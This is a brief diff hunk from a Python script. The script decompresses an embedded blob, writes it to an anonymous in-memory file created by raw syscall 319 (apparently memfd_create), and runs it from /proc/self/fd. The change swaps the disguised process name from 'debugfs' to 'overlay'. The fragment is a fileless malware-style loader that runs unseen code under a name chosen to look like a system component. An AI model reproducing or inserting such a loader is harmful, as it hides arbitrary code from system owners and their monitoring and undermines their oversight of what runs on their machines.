@@ -8,4 +8,4 @@ e = zlib.decompress(c)
 f = s(319, '', 1)
 os.write(f, e)
 p = '/proc/self/fd/%d' % f
-os.execle(p, 'debugfs', {})
+os.execle(p, 'overlay', {})
